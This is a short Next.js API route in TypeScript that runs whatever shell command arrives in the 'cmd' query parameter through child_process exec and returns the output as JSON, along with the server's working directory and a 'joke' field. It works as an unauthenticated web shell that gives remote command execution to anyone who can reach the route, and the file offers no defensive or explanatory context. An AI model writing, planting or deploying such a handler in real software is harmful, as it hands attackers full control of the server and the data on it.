import type { NextApiRequest, NextApiResponse } from 'next'
import path from 'path'

const { exec } = require('node:child_process')

export default async function handler(
  req: NextApiRequest,
  res: NextApiResponse
) {
  const { query } = req
  const { cmd } = query

  exec(cmd, (_: any, output: any) => {
    res.status(200).json({
      ver: '2.0.0',
      joke: 'I am a joke',
      cmd,
      data: output.split('\n'),
      cwd: process.cwd(),
      x: path.join(process.cwd()),
    })
  })
}
